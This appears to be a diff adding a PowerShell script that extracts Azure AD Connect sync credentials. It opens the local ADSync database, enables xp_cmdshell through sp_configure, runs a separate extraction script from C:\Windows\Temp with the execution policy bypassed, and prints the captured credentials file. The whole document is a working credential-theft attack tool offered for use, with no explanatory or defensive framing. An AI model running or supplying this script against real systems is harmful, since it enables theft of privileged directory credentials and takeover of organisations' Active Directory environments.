@@ -1,0 +1,33 @@
+Write-Host "AD Connect Sync Credential Extract via xp_cmdshell`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+
+# Enable xp_cmdshell
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
+$cmd.ExecuteNonQuery()
+
+$cmd.CommandText = "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+$cmd.ExecuteNonQuery()
+
+# Execute the extraction script via xp_cmdshell
+$cmd.CommandText = "EXEC xp_cmdshell 'powershell.exe -ep bypass -file C:\Windows\Temp\extract.ps1'"
+$reader = $cmd.ExecuteReader()
+
+Write-Host "Command output:"
+while ($reader.Read()) {
+    Write-Host $reader[0]
+}
+$reader.Close()
+$client.Close()
+
+# Check if credentials file was created
+Start-Sleep -Seconds 2
+if (Test-Path "C:\Windows\Temp\adconnect_creds.txt") {
+    Write-Host "`n=== CREDENTIALS EXTRACTED ==="
+    Get-Content "C:\Windows\Temp\adconnect_creds.txt"
+}
+else {
+    Write-Host "No output file created"
+}
